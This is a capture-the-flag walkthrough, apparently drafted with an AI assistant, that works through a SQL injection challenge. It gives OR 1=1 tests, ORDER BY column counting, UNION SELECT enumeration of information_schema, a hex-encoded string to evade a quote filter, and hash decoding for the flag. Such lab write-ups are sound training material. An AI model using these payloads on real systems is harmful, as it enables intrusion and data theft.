# 🧩 Hack Me Challenge Walkthrough

### 🎯 Objective

Exploit an **SQL Injection** vulnerability on a web application to retrieve the hidden flag.

---

### 🧑‍💻 Step-by-Step Exploitation

#### 1️⃣ Basic Injection — Discovering User Data

**Payload used:**

```
1 OR 1=1
```

**👉 Goal:**
Test whether the input field was vulnerable to SQL Injection.

**✅ Result:**

<img width="1414" height="800" alt="Capture d’écran 2025-08-21 à 19 12 18" src="https://github.com/user-attachments/assets/cf3db248-7724-4277-b99c-664720f03636" />

---

#### 2️⃣ Finding the Number of Columns

**Payloads used:**

```
1 ORDER BY 1 → Valid  
1 ORDER BY 2 → Valid  
1 ORDER BY 3 → Error
```

**👉 Goal:**
Determine how many columns the query uses.

**✅ Result:**

* Error at `ORDER BY 3` confirmed **2 columns** in the query.
* Essential for crafting correct `UNION SELECT` statements.

---

#### 3️⃣ Table Enumeration

**Payload used:**

```
1 UNION SELECT table_name, null FROM information_schema.tables
```

**👉 Goal:**
List all tables in the database.

**✅ Result:**

<img width="1433" height="812" alt="Capture d’écran 2025-08-21 à 19 13 24" src="https://github.com/user-attachments/assets/d278ebc2-db18-45b9-8f7b-c4bef8049a48" />


* Among results, the table **list\_images** stood out.
* Likely contains valuable data related to the flag.

---

#### 4️⃣ Bypassing Quote Restrictions — Hexadecimal Trick

* The app filtered quotes, so strings had to be converted to **hex**.
* Example: `'list_images' → 0x6c6973745f696d61676573`

**Payload used:**

```
1 UNION SELECT column_name, null 
FROM information_schema.columns 
WHERE table_name=0x6c6973745f696d61676573 --
```

**✅ Result:**

<img width="1316" height="798" alt="Capture d’écran 2025-08-21 à 19 14 19" src="https://github.com/user-attachments/assets/cb953c1a-7a3f-415c-91d2-fe825a655ef4" />

* Successfully enumerated all columns of `list_images`: `id`, `title`, `url`, `comment`.

---

#### 5️⃣ Extracting Table Content

* With column names known, extracted two fields at a time.

**Payload used:**

```
1 UNION SELECT id, comment FROM list_images
```

**✅ Result:**

<img width="1169" height="621" alt="Capture d’écran 2025-08-21 à 19 16 10" src="https://github.com/user-attachments/assets/adee64c0-bc32-448a-9013-af2c37e02502" />

* Exposed additional data, including partial flag hints.

---

**✅ Result:**

* MD5 : https://md5decrypt.net/
  <img width="1436" height="504" alt="Capture d’écran 2025-08-21 à 19 19 10" src="https://github.com/user-attachments/assets/a28a3540-e526-4af2-af15-75398c00a56f" />

* SHA-256 : https://emn178.github.io/online-tools/sha256.html

<img width="1440" height="784" alt="Capture d’écran 2025-08-21 à 19 20 43" src="https://github.com/user-attachments/assets/2d57c175-49d5-41b1-85fc-d1da1705568f" />

---

### 🏁 Conclusion

This challenge highlighted several **classic SQL Injection tactics**, combined with practical twists:

* Special character filtering requiring **hexadecimal bypass**.

* Deductive reasoning to focus on relevant tables (`list_images`, `users`).

* Cryptography knowledge to convert MD5 → SHA-256 for the final flag.

* **Turning point:** spotting `GetTheFlag` entry.

* **Final success:** extracting `Commentaire` and `Countersign` fields and decoding the hash.

---


Do you want me to make it more **formal (report style)** or more like a **walkthrough (step-by-step with explanations)** for your README?
